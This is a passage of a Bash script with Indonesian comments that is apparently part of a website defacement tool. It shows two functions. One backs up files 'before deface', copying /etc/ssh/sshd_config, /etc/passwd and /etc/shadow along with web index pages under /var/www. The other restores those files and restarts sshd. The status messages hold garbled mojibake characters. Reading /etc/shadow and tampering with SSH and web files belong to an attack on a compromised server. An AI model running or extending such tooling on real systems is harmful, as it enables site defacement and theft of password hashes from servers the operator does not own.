# ==============================================
# FUNGSI BACKUP SEBELUM DEFACE
# ==============================================
backup_files() {
    echo -e "\n${YELLOW}[â€¢] Membuat backup sebelum deface...${NC}"
    mkdir -p "$BACKUP_DIR"
    
    # Backup file-file penting
    cp /etc/ssh/sshd_config "$BACKUP_DIR/sshd_config.backup" 2>/dev/null
    cp /etc/passwd "$BACKUP_DIR/passwd.backup" 2>/dev/null
    cp /etc/shadow "$BACKUP_DIR/shadow.backup" 2>/dev/null
    
    # Backup web files
    find /var/www -type f -name "index.html" -o -name "index.php" -o -name "*.blade.php" 2>/dev/null | while read file; do
        if [ -f "$file" ]; then
            rel_path=$(echo "$file" | sed 's|/|_|g')
            cp "$file" "$BACKUP_DIR$rel_path.backup" 2>/dev/null
        fi
    done
    
    echo -e "${GREEN}  âœ… Backup disimpan di: $BACKUP_DIR${NC}"
}

# ==============================================
# FUNGSI RESTORE KE AWAL
# ==============================================
restore_original() {
    echo -e "\n${BLUE}ğŸ”„ ====== RESTORE KE AWAL ====== ğŸ”„${NC}"
    echo -e "${WHITE}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”${NC}"
    
    # Cek apakah ada backup
    if [ ! -d "$BACKUP_DIR" ]; then
        echo -e "${RED}âŒ Tidak ada backup ditemukan!${NC}"
        return 1
    fi
    
    echo -e "${YELLOW}[â€¢] Memulihkan file dari backup...${NC}"
    
    # Restore SSH config
    if [ -f "$BACKUP_DIR/sshd_config.backup" ]; then
        cp "$BACKUP_DIR/sshd_config.backup" /etc/ssh/sshd_config
        systemctl restart sshd 2>/dev/null || service ssh restart 2>/dev/null
        echo -e "${GREEN}  âœ… SSH config dikembalikan${NC}"
    fi
    
    # Restore web files
    find /var/www -type f -name "index.html" -o -name "index.php" -o -name "*.blade.php" 2>/dev/null | while read file; do
        rel_path=$(echo "$file" | sed 's|/|_|g')
        backup_file="$BACKUP_DIR$rel_path.backup"
        if [ -f "$backup_file" ]; then
            cp "$backup_file" "$file"
            echo -e "${GREEN}  âœ… Restore: $file${NC}"
        fi
    done
    
    echo -e "\n${GREEN}âœ… RESTORE SELESAI! Semua file dikembalikan ke awal.${NC}"
}

